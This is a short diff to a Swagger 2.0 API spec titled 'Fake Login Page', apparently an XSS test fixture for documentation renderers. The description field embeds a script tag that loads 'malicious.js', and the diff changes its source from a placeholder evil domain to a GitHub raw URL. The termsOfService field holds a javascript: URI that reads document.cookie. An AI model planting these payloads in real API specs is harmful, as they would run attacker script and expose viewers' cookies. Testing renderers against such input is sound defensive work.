@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   version: 1.0.0
   title: Fake Login Page
-  description: '<div class="login-form"><script src="https://your-evil-script.com/malicious.js"></script></div>'
+  description: '<div class="login-form"><script src="https://raw.githubusercontent.com/bilauk/checkSWG/main/malicious.js"></script></div>'
   termsOfService: "javascript:alert(document.cookie)"
   contact: 
     name: "API Support"
